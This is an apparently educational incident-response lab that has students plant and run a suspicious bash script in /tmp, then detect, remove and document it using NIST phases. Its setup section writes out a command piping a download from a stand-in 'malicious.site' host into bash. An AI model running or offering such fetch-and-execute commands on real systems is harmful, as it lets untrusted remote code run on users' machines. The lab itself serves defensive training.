# **Day#12: Incident Response Basics – Suspicious Bash Script Execution**

---

## 🎯 **Objective:**  
The objective of this lab is to help students understand the **core steps of incident response** by investigating a **suspicious bash script execution** on a Linux system. Students will learn how to detect, analyze, and respond to a basic script-based intrusion.

---

## 📘 **What is Incident Response?**

**Incident Response (IR)** is the process of detecting and managing a cybersecurity incident to minimize impact and restore normal operations. This lab introduces a basic Linux scenario where an attacker’s script is executed through user error or misconfiguration.

## 🔁 **Incident Response Process (NIST SP 800-61 Rev. 2)**

| **Phase**                         | **Description**                                                                 |
|----------------------------------|---------------------------------------------------------------------------------|
| **1. Preparation**               | Ensure logging is enabled, tools are installed, and the system is ready.        |
| **2. Detection and Analysis**    | Identify suspicious activity using logs, running processes, and file checks.    |
| **3. Containment, Eradication, and Recovery** | Isolate the threat, remove the script, and secure the system.                    |
| **4. Post-Incident Activity**    | Document the incident and implement prevention steps.                          |

## ⚠️ **Scenario: Suspicious Script Found in /tmp**

Your monitoring system flagged a suspicious file in `/tmp`. Upon inspection, it's a bash script (`payload.sh`) that connects to an unknown IP. You are tasked with investigating this incident.

---

## 🛠️ **Lab Setup**

### **System Requirements:**
- Ubuntu 20.04/22.04 or Kali Linux
- Terminal access with sudo privileges

### **Simulate the Incident:**

```bash
echo -e '#!/bin/bash\ncurl http://malicious.site/payload.sh | bash' > /tmp/payload.sh
chmod +x /tmp/payload.sh
```
Execute the script (mimicking a compromised action):

```
bash /tmp/payload.sh
```

## 🧪 Step-by-Step Investigation

### 1. Preparation
Ensure auditd, syslog, or basic logging is enabled.

- Install curl, lsof, ps, and grep (usually pre-installed).

### 2. Detection and Analysis
- Check running processes:
```
ps aux | grep curl
```
- Search for suspicious files:
```
find /tmp -name "*.sh"
```
- Review .bash_history for executed commands:
```
cat ~/.bash_history | grep payload.sh
```
- Check cron entries (to verify no persistence):
```
crontab -l
grep -r "payload.sh" /etc/cron*
```
### 3. Containment, Eradication, and Recovery
- Kill any related processes:
```
pkill curl
```
- Remove the malicious script:
```
rm -f /tmp/payload.sh
```
- Clear the crontab if persistence was found:
```
crontab -e
```
- Restart services if needed and log out inactive sessions.
### 4. Post-Incident Activity
- Document:
 -  What triggered the alert?
 -  What was the script doing?
 - Which user executed it?

- Recommendations:
 - Enable file integrity monitoring (e.g., AIDE).
 - Restrict /tmp execution using mount options (noexec).
 - Educate users about unknown script execution.

## Lab Checklist
✅ Simulate Script	Create and execute a suspicious bash script
✅ Investigate Logs	Use commands to analyze the event
✅ Kill and Delete	Contain and remove the malicious file
✅ Document Findings	Note IPs, users, and recommendations

## 📸 Submission
Submit screenshots of:
- The malicious script content
- Process list showing the script or curl
- .bash_history showing the command
- Script deleted from /tmp
